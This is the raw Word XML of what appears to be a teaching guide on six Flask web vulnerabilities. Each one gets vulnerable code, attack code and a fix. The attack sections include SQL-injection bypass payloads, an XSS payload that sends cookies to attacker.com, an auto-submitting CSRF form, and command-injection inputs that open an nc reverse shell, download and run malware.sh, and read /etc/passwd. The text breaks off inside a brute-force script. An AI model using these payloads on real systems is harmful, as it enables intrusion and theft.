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Challenges - Fixes and Attack Codes</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Complete Guide to Vulnerabilities and Their Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>1. Unvalidated Redirect</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>VULNERABILITY:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The application redirects users to URLs without proper validation, allowing attackers to redirect victims to malicious sites.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>VULNERABLE CODE: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@app.route('/go')</w:t>
        <w:br/>
        <w:t>def go():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    target = request.args.get('next') or '/'</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return redirect(target, code=302)  # No validation!</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>ATTACK CODE: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Attack 1: External redirect to steal credentials</w:t>
        <w:br/>
        <w:t>GET /go?next=https://evil.com/fake-login HTTP/1.1</w:t>
        <w:br/>
        <w:br/>
        <w:t># Attack 2: Protocol-relative URL</w:t>
        <w:br/>
        <w:t>GET /go?next=//evil.com/phishing HTTP/1.1</w:t>
        <w:br/>
        <w:br/>
        <w:t># Attack 3: Bypass attempt with encoded characters</w:t>
        <w:br/>
        <w:t>GET /go?next=%2F%2Fevil.com HTTP/1.1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>FIX CODE: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from flask import Flask, request, redirect, abort</w:t>
        <w:br/>
        <w:t>from urllib.parse import urlparse</w:t>
        <w:br/>
        <w:br/>
        <w:t>ALLOWED_PATHS = ['/dashboard', '/profile', '/settings', '/home']</w:t>
        <w:br/>
        <w:br/>
        <w:t>@app.route('/go')</w:t>
        <w:br/>
        <w:t>def go():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    target = request.args.get('next') or '/'</w:t>
        <w:br/>
        <w:t xml:space="preserve">    parsed = urlparse(target)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    # Block absolute and protocol-relative URLs</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if parsed.scheme or parsed.netloc:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        abort(400)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    # Require a leading slash for local paths</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if not target.startswith('/'):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        abort(400)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    # Enforce allowlist</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if target not in ALLOWED_PATHS:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        abort(400)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    return redirect(target, code=302)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>2. SQL Injection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>VULNERABILITY:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The application builds SQL queries using string concatenation with user input, allowing attackers to manipulate the query logic.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>VULNERABLE CODE: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@app.route('/login', methods=['POST'])</w:t>
        <w:br/>
        <w:t>def login():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    username = request.json.get('username')</w:t>
        <w:br/>
        <w:t xml:space="preserve">    password = request.json.get('password')</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    # VULNERABLE: Direct string concatenation</w:t>
        <w:br/>
        <w:t xml:space="preserve">    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    cursor.execute(query)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    user = cursor.fetchone()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    if user:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return jsonify({"message": "Login successful!"}), 200</w:t>
        <w:br/>
        <w:t xml:space="preserve">    else:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return jsonify({"message": "Invalid credentials"}), 401</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>ATTACK CODE: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Attack 1: Bypass authentication</w:t>
        <w:br/>
        <w:t>POST /login HTTP/1.1</w:t>
        <w:br/>
        <w:t>Content-Type: application/json</w:t>
        <w:br/>
        <w:br/>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "username": "admin' OR '1'='1' -- ",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "password": "anything"</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t># Attack 2: Extract data from other tables</w:t>
        <w:br/>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "username": "admin' UNION SELECT username, password FROM admin_users -- ",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "password": "x"</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t># Attack 3: Time-based blind SQL injection</w:t>
        <w:br/>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "username": "admin' AND SLEEP(5) -- ",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "password": "x"</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t># Python attack script</w:t>
        <w:br/>
        <w:t>import requests</w:t>
        <w:br/>
        <w:br/>
        <w:t>payload = {"username": "admin' OR '1'='1' -- ", "password": "any_password"}</w:t>
        <w:br/>
        <w:t>response = requests.post("http://localhost:5000/login", json=payload)</w:t>
        <w:br/>
        <w:t>print(response.json())</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>FIX CODE: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@app.route('/login', methods=['POST'])</w:t>
        <w:br/>
        <w:t>def login():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    username = request.json.get('username')</w:t>
        <w:br/>
        <w:t xml:space="preserve">    password = request.json.get('password')</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    # FIX: Use parameterized queries</w:t>
        <w:br/>
        <w:t xml:space="preserve">    query = "SELECT * FROM users WHERE username = %s AND password = %s"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    cursor.execute(query, (username, password))</w:t>
        <w:br/>
        <w:t xml:space="preserve">    user = cursor.fetchone()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    if user:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return jsonify({"message": "Login successful!"}), 200</w:t>
        <w:br/>
        <w:t xml:space="preserve">    else:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return jsonify({"message": "Invalid credentials"}), 401</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>3. Cross-Site Scripting (XSS)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>VULNERABILITY:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The application displays user input without proper sanitization, allowing attackers to inject malicious JavaScript code.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>VULNERABLE CODE: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@app.route('/', methods=['GET', 'POST'])</w:t>
        <w:br/>
        <w:t>def index():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if request.method == 'POST':</w:t>
        <w:br/>
        <w:t xml:space="preserve">        content = request.form.get('content', '')</w:t>
        <w:br/>
        <w:t xml:space="preserve">        comments.append(content)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    # VULNERABLE: Direct concatenation without escaping</w:t>
        <w:br/>
        <w:t xml:space="preserve">    comments_html = ""</w:t>
        <w:br/>
        <w:t xml:space="preserve">    for c in comments:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        comments_html += f"&lt;div class='comment'&gt;{c}&lt;/div&gt;"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    template = f"""</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;html&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;body&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        &lt;h1&gt;Blog Comments&lt;/h1&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        &lt;form method="post"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">            &lt;input type="text" name="content"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">            &lt;button type="submit"&gt;Post&lt;/button&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        &lt;/form&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        &lt;div id="comments-section"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">            {comments_html}</w:t>
        <w:br/>
        <w:t xml:space="preserve">        &lt;/div&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;/body&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;/html&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    """</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return render_template_string(template)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>ATTACK CODE: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Attack 1: Basic XSS - Cookie stealing</w:t>
        <w:br/>
        <w:t>&lt;script&gt;alert('XSS')&lt;/script&gt;</w:t>
        <w:br/>
        <w:t>&lt;script&gt;document.location='http://attacker.com/?c='+document.cookie&lt;/script&gt;</w:t>
        <w:br/>
        <w:br/>
        <w:t># Attack 2: Event handler XSS</w:t>
        <w:br/>
        <w:t>&lt;img src=x onerror="alert('XSS')"&gt;</w:t>
        <w:br/>
        <w:t>&lt;body onload="alert('XSS')"&gt;</w:t>
        <w:br/>
        <w:br/>
        <w:t># Attack 3: DOM-based XSS</w:t>
        <w:br/>
        <w:t>&lt;iframe src="javascript:alert('XSS')"&gt;&lt;/iframe&gt;</w:t>
        <w:br/>
        <w:t>&lt;svg onload="alert('XSS')"&gt;</w:t>
        <w:br/>
        <w:br/>
        <w:t># Attack 4: Bypass filters</w:t>
        <w:br/>
        <w:t>&lt;ScRiPt&gt;alert('XSS')&lt;/ScRiPt&gt;</w:t>
        <w:br/>
        <w:t>&lt;img src="x" onerror="eval(atob('YWxlcnQoJ1hTUycpCg=='))"&gt;</w:t>
        <w:br/>
        <w:br/>
        <w:t># Python attack script</w:t>
        <w:br/>
        <w:t>import requests</w:t>
        <w:br/>
        <w:br/>
        <w:t>xss_payload = "&lt;script&gt;alert('HACKED')&lt;/script&gt;"</w:t>
        <w:br/>
        <w:t>response = requests.post("http://localhost:5000", data={"content": xss_payload})</w:t>
        <w:br/>
        <w:t>if xss_payload in response.text:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("XSS vulnerability confirmed!")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>FIX CODE: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from flask import Flask, request, render_template_string</w:t>
        <w:br/>
        <w:t>from markupsafe import escape</w:t>
        <w:br/>
        <w:br/>
        <w:t>@app.route('/', methods=['GET', 'POST'])</w:t>
        <w:br/>
        <w:t>def index():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if request.method == 'POST':</w:t>
        <w:br/>
        <w:t xml:space="preserve">        content = request.form.get('content', '')</w:t>
        <w:br/>
        <w:t xml:space="preserve">        comments.append(content)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    # FIX 1: Use Jinja2 autoescape</w:t>
        <w:br/>
        <w:t xml:space="preserve">    template = """</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;html&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;body&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        &lt;h1&gt;Blog Comments&lt;/h1&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        &lt;form method="post"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">            &lt;input type="text" name="content"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">            &lt;button type="submit"&gt;Post&lt;/button&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        &lt;/form&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        &lt;div id="comments-section"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">            {% for comment in comments %}</w:t>
        <w:br/>
        <w:t xml:space="preserve">                &lt;div class='comment'&gt;{{ comment }}&lt;/div&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">            {% endfor %}</w:t>
        <w:br/>
        <w:t xml:space="preserve">        &lt;/div&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;/body&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;/html&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    """</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return render_template_string(template, comments=comments)</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # FIX 2: Manual escaping</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # comments_html = ""</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # for c in comments:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    #     comments_html += f"&lt;div class='comment'&gt;{escape(c)}&lt;/div&gt;"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>4. Cross-Site Request Forgery (CSRF)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>VULNERABILITY:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The application performs state-changing operations without validating CSRF tokens, allowing attackers to forge requests on behalf of authenticated users.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>VULNERABLE CODE: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@app.route('/transfer', methods=['POST'])</w:t>
        <w:br/>
        <w:t>def transfer():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    current_user = 'Alice'</w:t>
        <w:br/>
        <w:t xml:space="preserve">    to_user = request.form.get('to_user')</w:t>
        <w:br/>
        <w:t xml:space="preserve">    amount = request.form.get('amount')</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    # VULNERABLE: No CSRF token validation</w:t>
        <w:br/>
        <w:t xml:space="preserve">    cursor.execute("UPDATE accounts SET balance = balance - ? WHERE username=?", (amount, current_user))</w:t>
        <w:br/>
        <w:t xml:space="preserve">    cursor.execute("UPDATE accounts SET balance = balance + ? WHERE username=?", (amount, to_user))</w:t>
        <w:br/>
        <w:t xml:space="preserve">    db_conn.commit()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return jsonify({"message": "Transfer successful"}), 200</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>ATTACK CODE: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&lt;!-- Attack HTML page hosted on attacker's site --&gt;</w:t>
        <w:br/>
        <w:t>&lt;!DOCTYPE html&gt;</w:t>
        <w:br/>
        <w:t>&lt;html&gt;</w:t>
        <w:br/>
        <w:t>&lt;body&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;h1&gt;Win a Free iPhone!&lt;/h1&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;!-- Hidden form that submits automatically --&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;form id="csrf-form" action="http://vulnerable-bank.com/transfer" method="POST"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        &lt;input type="hidden" name="to_user" value="attacker"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        &lt;input type="hidden" name="amount" value="1000"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;/form&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;script&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        document.getElementById('csrf-form').submit();</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;/script&gt;</w:t>
        <w:br/>
        <w:t>&lt;/body&gt;</w:t>
        <w:br/>
        <w:t>&lt;/html&gt;</w:t>
        <w:br/>
        <w:br/>
        <w:t>&lt;!-- JavaScript-based CSRF attack --&gt;</w:t>
        <w:br/>
        <w:t>&lt;script&gt;</w:t>
        <w:br/>
        <w:t>fetch('http://vulnerable-bank.com/transfer', {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    method: 'POST',</w:t>
        <w:br/>
        <w:t xml:space="preserve">    credentials: 'include',</w:t>
        <w:br/>
        <w:t xml:space="preserve">    headers: {'Content-Type': 'application/x-www-form-urlencoded'},</w:t>
        <w:br/>
        <w:t xml:space="preserve">    body: 'to_user=attacker&amp;amount=1000'</w:t>
        <w:br/>
        <w:t>});</w:t>
        <w:br/>
        <w:t>&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>FIX CODE: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import secrets</w:t>
        <w:br/>
        <w:t>from flask import Flask, request, jsonify, session</w:t>
        <w:br/>
        <w:br/>
        <w:t>app.secret_key = 'your-secret-key-here'</w:t>
        <w:br/>
        <w:br/>
        <w:t>@app.route('/form', methods=['GET'])</w:t>
        <w:br/>
        <w:t>def transfer_form():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # Generate CSRF token</w:t>
        <w:br/>
        <w:t xml:space="preserve">    token = secrets.token_hex(16)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    session['csrf_token'] = token</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return jsonify({"message": "Form loaded", "csrf_token": token})</w:t>
        <w:br/>
        <w:br/>
        <w:t>@app.route('/transfer', methods=['POST'])</w:t>
        <w:br/>
        <w:t>def transfer():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    current_user = 'Alice'</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    # FIX: Validate CSRF token</w:t>
        <w:br/>
        <w:t xml:space="preserve">    session_token = session.get('csrf_token')</w:t>
        <w:br/>
        <w:t xml:space="preserve">    request_token = request.form.get('csrf_token') or request.headers.get('X-CSRF-Token')</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    if not session_token or session_token != request_token:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return jsonify({"error": "Invalid CSRF token"}), 403</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    to_user = request.form.get('to_user')</w:t>
        <w:br/>
        <w:t xml:space="preserve">    amount = request.form.get('amount')</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    cursor.execute("UPDATE accounts SET balance = balance - ? WHERE username=?", (amount, current_user))</w:t>
        <w:br/>
        <w:t xml:space="preserve">    cursor.execute("UPDATE accounts SET balance = balance + ? WHERE username=?", (amount, to_user))</w:t>
        <w:br/>
        <w:t xml:space="preserve">    db_conn.commit()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return jsonify({"message": "Transfer successful"}), 200</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>5. Command Injection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>VULNERABILITY:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The application executes system commands with user-controlled input without proper validation, allowing command injection.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>VULNERABLE CODE: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@app.route('/ping', methods=['POST'])</w:t>
        <w:br/>
        <w:t>def ping():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    host = request.json.get("host", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    # VULNERABLE: shell=True with user input</w:t>
        <w:br/>
        <w:t xml:space="preserve">    result = subprocess.run(</w:t>
        <w:br/>
        <w:t xml:space="preserve">        f"ping -c 1 {host}",</w:t>
        <w:br/>
        <w:t xml:space="preserve">        shell=True,</w:t>
        <w:br/>
        <w:t xml:space="preserve">        capture_output=True,</w:t>
        <w:br/>
        <w:t xml:space="preserve">        text=True</w:t>
        <w:br/>
        <w:t xml:space="preserve">    )</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return jsonify({"output": result.stdout})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>ATTACK CODE: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Attack 1: Chain commands using semicolon</w:t>
        <w:br/>
        <w:t>POST /ping HTTP/1.1</w:t>
        <w:br/>
        <w:t>Content-Type: application/json</w:t>
        <w:br/>
        <w:br/>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "host": "127.0.0.1; cat /etc/passwd"</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t># Attack 2: Chain commands using &amp;&amp;</w:t>
        <w:br/>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "host": "127.0.0.1 &amp;&amp; whoami"</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t># Attack 3: Pipe to other commands</w:t>
        <w:br/>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "host": "127.0.0.1 | ls -la /"</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t># Attack 4: Background execution</w:t>
        <w:br/>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "host": "127.0.0.1 &amp; nc attacker.com 4444 -e /bin/bash &amp;"</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t># Python attack script</w:t>
        <w:br/>
        <w:t>import requests</w:t>
        <w:br/>
        <w:br/>
        <w:t>payloads = [</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "127.0.0.1; cat /etc/passwd",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "127.0.0.1 &amp;&amp; ls -la",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "127.0.0.1 | whoami",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "127.0.0.1; wget http://attacker.com/malware.sh -O /tmp/m.sh &amp;&amp; bash /tmp/m.sh"</w:t>
        <w:br/>
        <w:t>]</w:t>
        <w:br/>
        <w:br/>
        <w:t>for payload in payloads:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    response = requests.post("http://localhost:5000/ping", json={"host": payload})</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print(f"Payload: {payload}")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print(f"Response: {response.json()}")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>FIX CODE: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@app.route('/ping', methods=['POST'])</w:t>
        <w:br/>
        <w:t>def ping():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    host = request.json.get("host", "").strip()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    # FIX 1: Use allowlist validation</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ALLOWED_HOSTS = ["127.0.0.1", "localhost", "8.8.8.8"]</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if host not in ALLOWED_HOSTS:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return jsonify({"error": "Host not allowed"}), 403</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    # FIX 2: Use shell=False and pass command as list</w:t>
        <w:br/>
        <w:t xml:space="preserve">    try:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        result = subprocess.run(</w:t>
        <w:br/>
        <w:t xml:space="preserve">            ["ping", "-c", "1", host],  # Command as list</w:t>
        <w:br/>
        <w:t xml:space="preserve">            shell=False,  # Don't use shell</w:t>
        <w:br/>
        <w:t xml:space="preserve">            capture_output=True,</w:t>
        <w:br/>
        <w:t xml:space="preserve">            text=True,</w:t>
        <w:br/>
        <w:t xml:space="preserve">            timeout=5</w:t>
        <w:br/>
        <w:t xml:space="preserve">        )</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return jsonify({"output": result.stdout})</w:t>
        <w:br/>
        <w:t xml:space="preserve">    except Exception as e:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return jsonify({"error": str(e)}), 500</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>6. Broken Authentication</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>VULNERABILITY:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The application has no rate limiting or account lockout, allowing unlimited login attempts for brute force attacks.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>VULNERABLE CODE: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users = {"admin": "complex_password_123"}</w:t>
        <w:br/>
        <w:br/>
        <w:t>@app.route('/login', methods=['POST'])</w:t>
        <w:br/>
        <w:t>def login():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    username = request.json.get('username')</w:t>
        <w:br/>
        <w:t xml:space="preserve">    password = request.json.get('password')</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    # VULNERABLE: No rate limiting or lockout</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if username in users and users[username] == password:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return jsonify({"message": "Login successful"}), 200</w:t>
        <w:br/>
        <w:t xml:space="preserve">    else:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return jsonify({"error": "Invalid credentials"}), 401</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>ATTACK CODE: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Python brute force attack script</w:t>
        <w:br/>
        <w:t>import requests</w:t>
        <w:br/>
        <w:t>import itertools</w:t>
        <w:br/>
        <w:t>import string</w:t>
        <w:br/>
        <w:br/>
        <w:t>target = "http://localhost:5000/login"</w:t>
        <w:br/>
        <w:t>username = "admin"</w:t>
        <w:br/>
        <w:br/>
        <w:t># Simple password list</w:t>
        <w:br/>
        <w:t>passwords = [</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "password", "123456", "admin", "letmein",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "password123", "admin123", "complex_password_123"</w:t>
        <w:br/>
        <w:t>]</w:t>
